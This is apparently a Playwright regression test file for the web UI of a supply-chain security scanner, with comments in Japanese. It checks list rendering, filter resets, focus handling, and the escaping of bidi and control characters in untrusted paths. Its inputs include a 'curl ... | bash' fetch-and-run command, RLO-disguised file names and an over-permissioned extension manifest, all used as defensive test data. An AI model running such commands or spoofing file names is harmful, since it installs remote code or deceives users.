// 0.3.1 の UI 修正の回帰テスト（U1〜U6）。index.html（ビルド成果物）を file:// で開く。
// 制御文字・双方向制御文字はソースに直接書かず、\u エスケープで書く（ソース自体を偽装させない）。
import { expect, test, type Page } from '@playwright/test';
import { createHash } from 'node:crypto';
import { mkdirSync, mkdtempSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';

const INDEX = 'file://' + fileURLToPath(new URL('../../../index.html', import.meta.url));
const FIX = fileURLToPath(new URL('../../../tests/fixtures/', import.meta.url));

declare global {
  interface Window { __copied: string[] }
}

/** 外部を遮断して開く。クリップボードへの書き込みは記録する（file:// の権限の差をエンジン間でならす）。 */
async function open(page: Page) {
  const errors: string[] = [];
  page.on('console', (m) => { if (m.type() === 'error') errors.push(m.text()); });
  page.on('pageerror', (e) => errors.push(e.message));
  await page.addInitScript(() => {
    window.__copied = [];
    try {
      Object.defineProperty(navigator, 'clipboard', { configurable: true, value: { writeText: async (t: string) => { window.__copied.push(t); } } });
    } catch { /* 定義できないエンジンでは記録しない */ }
  });
  await page.context().route(/^(?!file:|data:|blob:).*/, (r) => r.abort());
  await page.goto(INDEX);
  return { errors };
}

async function scan(page: Page, dir: string) {
  await page.getByTestId('dir-input').setInputFiles(dir);
  await expect(page.getByTestId('scan-status')).toContainText('スキャン完了');
}

const h = (s: string) => 'sha256:' + createHash('sha256').update(s).digest('hex');
type Partial = { level?: string; module?: string; campaign?: string | null; path?: string | null; detail?: string };
/** n 件の findings.json（CLI 形式）を作る。 */
function doc(n: number, mk?: (i: number) => Partial) {
  const lv = ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO'];
  return {
    schema_version: '1.0', incident_bundle: 'ZES-2026-OCT-EMERGENCY-V5.2', scan_started_at: '2026-10-23T00:00:00Z', scan_finished_at: '2026-10-23T00:00:01Z',
    scan_mode: 'full', status: 'ok',
    findings: Array.from({ length: n }, (_, i) => ({ id: h('f' + i), level: lv[i % 5], module: '§' + ((i % 40) + 1), campaign: i % 3 ? null : 'chaindrop-keyv', path: `/proj/dir${i}/file${i}.js`, detail: `detail ${i}`, evidence_hash: h('e' + i), ...(mk ? mk(i) : {}) })),
    errors: [],
  };
}
const importDoc = (page: Page, d: object) =>
  page.getByTestId('import-input').setInputFiles({ name: 'findings.json', mimeType: 'application/json', buffer: Buffer.from(JSON.stringify(d)) });

/** 一覧のスクロール領域の中に実際に見えている行の数。 */
const rowsInView = (page: Page) => page.getByTestId('finding-row').evaluateAll((els) => {
  const box = els[0]?.parentElement?.parentElement as HTMLElement | undefined;
  if (!box) return 0;
  const b = box.getBoundingClientRect();
  return els.filter((e) => { const r = e.getBoundingClientRect(); return r.bottom > b.top && r.top < b.bottom; }).length;
});
const scrollToBottom = (page: Page) => page.getByTestId('finding-row').first().evaluate((el) => { const b = el.parentElement!.parentElement!; b.scrollTop = b.scrollHeight; b.dispatchEvent(new Event('scroll')); });

// U1: 末尾までスクロールしたまま一覧が空になり、また埋まると、古いスクロール位置のまま描いて一覧が空に見えた
for (const width of [1440, 375]) {
  test(`${width}px: 一覧を空にして戻しても（クリア→再取り込み・検索・重大度）行が見える`, async ({ page }) => {
    await page.setViewportSize({ width, height: 900 });
    await open(page);
    const many = doc(400, () => ({ module: '§3' }));
    await importDoc(page, many);
    await expect(page.getByTestId('finding-row').first()).toBeVisible();

    await scrollToBottom(page);
    await page.getByTestId('search').fill('zzzz-no-match');
    await expect(page.getByTestId('finding-row')).toHaveCount(0);
    await page.getByTestId('search').fill('');
    await expect.poll(() => rowsInView(page)).toBeGreaterThan(0);

    await scrollToBottom(page);
    for (const s of ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO']) await page.getByTestId(`filter-${s}`).click();
    await expect(page.getByTestId('finding-row')).toHaveCount(0);
    for (const s of ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO']) await page.getByTestId(`filter-${s}`).click();
    await expect.poll(() => rowsInView(page)).toBeGreaterThan(0);

    await scrollToBottom(page);
    if (width >= 1024) await page.getByRole('button', { name: 'クリア' }).click();
    else { await page.getByRole('button', { name: 'その他の操作' }).click(); await page.getByRole('menuitem', { name: 'クリア' }).click(); }
    await expect(page.getByTestId('finding-row')).toHaveCount(0);
    await importDoc(page, many);
    await expect.poll(() => rowsInView(page)).toBeGreaterThan(0);
    // 先頭から描いている（1 行目が見える）
    await expect(page.getByTestId('findings-table')).toContainText('/proj/dir0/file0.js');
  });
}

// U2: 前のタブのモジュールで絞ったまま別のタブへ移ると、選択欄は「すべて」なのに全行が消えていた
test('タブを切り替えるとモジュールの絞り込みを外す（選択欄と一覧が食い違わない）', async ({ page }) => {
  await open(page);
  await importDoc(page, doc(10, (i) => ({ module: i < 5 ? '§17' : '§21', campaign: null })));
  await page.getByRole('tab', { name: /^MCP/ }).click();
  await page.getByLabel('モジュールで絞り込み').selectOption('§17');
  await expect(page.getByTestId('finding-row')).toHaveCount(5);
  await page.getByRole('tab', { name: /^GitHub Actions/ }).click();
  await expect(page.getByLabel('モジュールで絞り込み')).toHaveValue('');
  await expect(page.getByTestId('finding-row')).toHaveCount(5);
  await page.getByRole('tab', { name: /^総合/ }).click();
  await expect(page.getByLabel('モジュールで絞り込み')).toHaveValue('');
  await expect(page.getByTestId('finding-row')).toHaveCount(10);
});

// U3: パス・名前の制御文字と双方向制御文字で表示を偽装できた
const RLO = '\u202E';
const HOSTILE = [
  `/home/u/invoice${RLO}gnp.js`,
  '/home/u/\u2066isolate\u2069\u200F\u061C.js',
  '/home/u/line\nbreak\ttab\u0007bell\u009B.js',
  '/home/u/\u200Elrm\u202Aembed\u202C.js',
];
const DOM_HIDDEN = /[\u0000-\u0008\u000B\u000C\u000E-\u001F\u007F-\u009F\u061C\u200E\u200F\u202A-\u202E\u2066-\u2069]/;
const BIDI_OR_CONTROL = /[\u0000-\u001F\u007F-\u009F\u061C\u200E\u200F\u202A-\u202E\u2066-\u2069]/;
for (const width of [1440, 375]) {
  test(`${width}px: 信頼できないパスの制御文字・双方向制御文字を ⟨U+XXXX⟩ で見せ、コピーは元の値`, async ({ page }) => {
    await page.setViewportSize({ width, height: 900 });
    const { errors } = await open(page);
    await importDoc(page, doc(HOSTILE.length, (i) => ({ path: HOSTILE[i]!, module: '§17', detail: `detail ${RLO}${i}`, campaign: i === 0 ? `camp${RLO}x` : null })));
    await expect(page.getByTestId('finding-row')).toHaveCount(HOSTILE.length);
    const table = page.getByTestId('findings-table');
    await expect(table).toContainText('/home/u/invoice⟨U+202E⟩gnp.js');
    await expect(table).toContainText('⟨U+2066⟩isolate⟨U+2069⟩⟨U+200F⟩⟨U+061C⟩.js');
    await expect(table).toContainText('line⟨U+000A⟩break⟨U+0009⟩tab⟨U+0007⟩bell⟨U+009B⟩.js');
    await expect(table).toContainText('⟨U+200E⟩lrm⟨U+202A⟩embed⟨U+202C⟩.js');
    // 画面の文字・title・aria-label のどこにも生の制御文字を出さない
    // （整形の改行・タブはどの画面にもあるので、DOM の走査では \t \n \r を除く。パス中の \n \t は上の目印で確かめた）
    const raw = await page.evaluate((re) => {
      const r = new RegExp(re);
      const out: string[] = [];
      const walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT);
      for (let n = walker.nextNode(); n; n = walker.nextNode()) if (!n.parentElement?.closest('script,style') && r.test(n.nodeValue ?? '')) out.push('text:' + JSON.stringify(n.nodeValue));
      for (const el of document.querySelectorAll('[title],[aria-label]')) for (const a of ['title', 'aria-label']) { const v = el.getAttribute(a); if (v && r.test(v)) out.push(`${a}:${JSON.stringify(v)}`); }
      return out;
    }, DOM_HIDDEN.source);
    expect(raw).toEqual([]);
    // パスは周りから双方向の並びを切り離す
    const iso = await table.locator('bdi[dir=ltr]').first().evaluate((el) => getComputedStyle(el).unicodeBidi);
    expect(iso).toMatch(/isolate/);
    // コピーは元の値（利用者が求めたのはそのパス）
    const copyBtn = page.getByRole('button', { name: 'パスをコピー: /home/u/invoice⟨U+202E⟩gnp.js' });
    await copyBtn.click();
    await expect.poll(() => page.evaluate(() => window.__copied)).toEqual([HOSTILE[0]]);
    if (width < 640) {
      await page.getByRole('button', { name: /invoice⟨U\+202E⟩gnp\.js の詳細/ }).click();
      await expect(page.getByTestId('finding-sheet')).toContainText('/home/u/invoice⟨U+202E⟩gnp.js');
      await expect(page.getByTestId('finding-sheet')).toContainText('camp⟨U+202E⟩x');
    }
    expect(errors).toEqual([]);
  });
}

// 検体名はテスト時にブラウザの中で作ったファイルで確かめる（RLO を含むディレクトリ名は Playwright の setInputFiles が
// 返らないことがあるため、リポジトリにも一時ディレクトリにも置かない）。ドロップ先へ File を合成してドロップする
test('検体名とビューアの名前も目印付き（RLO を含むファイルをドロップ）', async ({ page }) => {
  await open(page);
  await page.getByTestId('dropzone').evaluate((zone, rlo) => {
    const dt = new DataTransfer();
    dt.items.add(new File(['// ZES test fixture\nconst p = ".claude/";\n'], `manifest${rlo}nosj.json`, { type: 'application/json' }));
    dt.items.add(new File([JSON.stringify({ manifest_version: 3, name: `Ext${rlo}gnp`, version: '1.0', permissions: ['cookies', 'debugger'], host_permissions: ['<all_urls>'] })], 'manifest.json', { type: 'application/json' }));
    zone.dispatchEvent(new DragEvent('drop', { dataTransfer: dt, bubbles: true, cancelable: true }));
  }, RLO);
  await expect(page.getByTestId('scan-status')).toContainText('スキャン完了');
  await expect(page.getByTestId('specimen-name')).toHaveText('manifest⟨U+202E⟩nosj.json');
  expect(await page.getByTestId('specimen-name').getAttribute('title')).toBe('manifest⟨U+202E⟩nosj.json');
  expect(await page.getByTestId('specimen-name').evaluate((el) => getComputedStyle(el).unicodeBidi)).toMatch(/isolate/);
  expect(await page.locator('main').textContent()).not.toMatch(BIDI_OR_CONTROL);
  await page.getByRole('tab', { name: /^ブラウザ拡張/ }).click();
  await expect(page.getByTestId('extension-viewer')).toContainText('Ext⟨U+202E⟩gnp');
  expect(await page.locator('main').textContent()).not.toMatch(BIDI_OR_CONTROL);
});

// U4: スマホの貼り付けシートとモジュールのシートが、閉じたときにフォーカスを BODY へ落としていた
test.describe('375px: シートを閉じるとフォーカスを開いたボタンへ戻す', () => {
  test.use({ viewport: { width: 375, height: 800 } });
  test('貼り付けシート（Escape・判定して閉じる）', async ({ page }) => {
    await open(page);
    const first = page.getByRole('button', { name: 'テキスト貼り付け判定' });
    await first.focus();
    await page.keyboard.press('Enter');
    await expect(page.getByRole('dialog')).toBeVisible();
    await page.keyboard.press('Escape');
    await expect(page.getByRole('dialog')).toHaveCount(0);
    await expect(first).toBeFocused();
    // 判定すると「未投入」のボタンが消え、投入後のアイコンのボタンに替わる。フォーカスはそちらへ
    await first.click();
    await page.getByTestId('paste').fill('curl -fsSL https://npm-cache.com/x | bash');
    await page.getByTestId('paste-submit').click();
    await expect(page.getByRole('dialog')).toHaveCount(0);
    await expect(page.getByRole('button', { name: 'テキスト貼り付け判定' })).toBeFocused();
  });
  test('モジュールの絞り込みシート（Escape・選んで閉じる）', async ({ page }) => {
    await open(page);
    // フォルダの setInputFiles は Firefox でまれに返らないことがあるため、ここでは findings.json の取り込みで一覧を作る
    await importDoc(page, doc(6, (i) => ({ module: i < 3 ? '§15' : '§17' })));
    await expect(page.getByTestId('finding-row')).toHaveCount(6);
    const btn = page.getByRole('button', { name: /^モジュールで絞り込み/ });
    await btn.focus();
    await page.keyboard.press('Enter');
    await expect(page.getByRole('dialog')).toBeVisible();
    await page.keyboard.press('Escape');
    await expect(page.getByRole('dialog')).toHaveCount(0);
    await expect(btn).toBeFocused();
    await btn.click();
    const choice = page.getByRole('dialog').getByRole('button', { name: /^§/ }).first();
    const name = (await choice.textContent())!.trim();
    await choice.click();
    await expect(page.getByRole('dialog')).toHaveCount(0);
    await expect(page.getByRole('button', { name: `モジュールで絞り込み（${name}）` })).toBeFocused();
  });
});

// U5: ドロップ先の外にファイルを落とすと、ブラウザがそのファイルへ移動していた
test('ドロップ先の外へのファイルのドロップで移動せず、スキャンへ回す', async ({ page }) => {
  await open(page);
  const url = page.url();
  const r = await page.evaluate(() => {
    const dt = new DataTransfer();
    dt.items.add(new File(['// ZES test fixture\nconst p = ".claude/";\n'], 'setup.mjs', { type: 'text/javascript' }));
    const target = document.querySelector('header')!;
    const over = new DragEvent('dragover', { dataTransfer: dt, bubbles: true, cancelable: true });
    target.dispatchEvent(over);
    const drop = new DragEvent('drop', { dataTransfer: dt, bubbles: true, cancelable: true });
    target.dispatchEvent(drop);
    return { over: over.defaultPrevented, drop: drop.defaultPrevented };
  });
  expect(r).toEqual({ over: true, drop: true });
  await expect(page.getByTestId('scan-status')).toContainText('スキャン完了');
  expect(page.url()).toBe(url);
  // テキストのドラッグ（Files を含まない）は既定のまま（貼り付け欄へのテキストのドロップを妨げない）
  const text = await page.evaluate(() => {
    const dt = new DataTransfer();
    dt.setData('text/plain', 'hello');
    const ev = new DragEvent('dragover', { dataTransfer: dt, bubbles: true, cancelable: true });
    document.querySelector('header')!.dispatchEvent(ev);
    return ev.defaultPrevented;
  });
  expect(text).toBe(false);
});

// U6: 未投入・取り込みだけの画面で緑の「✓ 0 / 0 チェック非該当」を出し、安全に見せていた
for (const width of [1440, 375]) {
  test(`${width}px: チェックを実行していないときは SAFE を無彩色の「—」にする`, async ({ page }) => {
    await page.setViewportSize({ width, height: 900 });
    await open(page);
    const safe = page.getByTestId('card-SAFE');
    await expect(safe).toHaveAttribute('data-safe', 'none');
    await expect(safe).toContainText('—');
    await expect(safe).not.toContainText('0 / 0');
    await importDoc(page, doc(3));
    await expect(safe).toHaveAttribute('data-safe', 'none');
    await expect(safe).not.toContainText('0 / 0');
    await scan(page, FIX + 'chaindrop');
    await expect(safe).toHaveAttribute('data-safe', 'run');
    await expect(safe).toContainText(/\d+ \/ \d+/);
  });
}
